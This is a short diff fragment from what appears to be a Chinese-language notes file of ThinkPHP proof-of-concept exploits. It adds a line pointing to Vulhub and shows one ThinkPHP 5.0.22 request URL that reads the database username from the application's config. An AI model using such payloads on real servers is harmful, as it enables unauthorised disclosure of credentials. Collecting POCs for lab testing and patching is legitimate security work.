@@ -11,6 +11,7 @@ phpMyadmin漏洞：
 
 ^
 ## **Thinkphp POC大全**
+在 Vulhub 中，也可以找到了该漏洞的利用 POC
 
 **Thinkphp 5.0.22 POC**
 1. `http://192.168.1.1/thinkphp/public/?s=.|think\config/get&name=database.username`
